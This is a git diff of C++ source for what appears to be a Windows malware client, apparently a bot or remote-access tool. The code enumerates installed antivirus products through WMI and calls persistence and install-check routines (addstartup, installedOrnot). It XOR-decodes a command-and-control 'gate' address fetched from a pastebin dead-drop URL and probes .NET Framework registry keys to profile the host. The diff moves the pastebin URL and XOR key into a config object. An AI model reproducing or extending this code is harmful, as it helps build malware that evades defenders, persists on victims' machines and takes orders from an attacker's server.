@@ -312,8 +312,35 @@ std::string installedOrnot() {
 		return "restart";
 	}
 }
+std::string& BstrToStdString(const BSTR bstr, std::string& dst, int cp = CP_UTF8)
+{
+	if (!bstr)
+	{
+		// define NULL functionality. I just clear the target.
+		dst.clear();
+		return dst;
+	}
 
-void avList() {
+	// request content length in single-chars through a terminating
+	//  nullchar in the BSTR. note: BSTR's support imbedded nullchars,
+	//  so this will only convert through the first nullchar.
+	int res = WideCharToMultiByte(cp, 0, bstr, -1, NULL, 0, NULL, NULL);
+	if (res > 0)
+	{
+		dst.resize(res);
+		WideCharToMultiByte(cp, 0, bstr, -1, &dst[0], res, NULL, NULL);
+	}
+	else
+	{    // no content. clear target
+		dst.clear();
+	}
+	return dst;
+}
+
+
+std::string avList() {
+
+	std::string returnString;
 	CoInitializeEx(0, 0);
 	CoInitializeSecurity(0, -1, 0, 0, 0, 3, 0, 0, 0);
 	IWbemLocator *locator = 0;
@@ -339,7 +366,7 @@ void avList() {
 				if (!u) break;//no more data,end enumeration
 				CComVariant cvtVersion;
 				object->Get(L"displayName", 0, &cvtVersion, 0, 0);
-				std::wcout << cvtVersion.bstrVal << std::endl;
+				std::wcout << cvtVersion.bstrVal;
 			}
 		}
 		else
@@ -353,47 +380,40 @@ void avList() {
 	CoUninitialize();
 	_getch();
 
+	return returnString;
 }
 
 std::string encryptDecrypt(std::string toEncrypt) {
-	char key[3] = {'K', 'C', 'Q'}; //Any chars will work
+	Config config;
 	std::string output = toEncrypt;
-
 	for (int i = 0; i < toEncrypt.size(); i++)
-		output[i] = toEncrypt[i] ^ key[i % (sizeof(key) / sizeof(char))];
+		output[i] = toEncrypt[i] ^ config.key[i % (sizeof(config.key) / sizeof(char))];
 
 	return output;
 }
 
 
+//int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
+int main(int argc, char *argv[]) {
+	Config config;
 
 
-
-int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
-//int main(int argc, char *argv[]) {
-	
-
-
-	//avList();
-	
-	
+	//std::string test = avList();
+	//std::cout << test;
+	/*
 	std::string insatlled = installedOrnot();
 	if (insatlled == "restart") {
 		std::cout << "restart program";
 		return 0;
 	}
-	
 	addstartup();
-	
-	//uninstall();
-	//return 0;
+	*/
 
-	//std::cout << encryptDecrypt(getComputerName());
-	//std::cout << encryptDecrypt(encryptDecrypt(getComputerName()));
-	http::Request request("http://pastebin.com/raw/Yd76WVbu");
+
+
+	http::Request request(config.pastebinUrl);
 	http::Response response = request.send("GET");
 	std::string gateFromPatebin = encryptDecrypt(responseToString(response));
-	//std::cout << gateFromPatebin;
 	std::string netFramework2 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727");
 	std::string netFramework3 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
 	std::string netFramework35 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
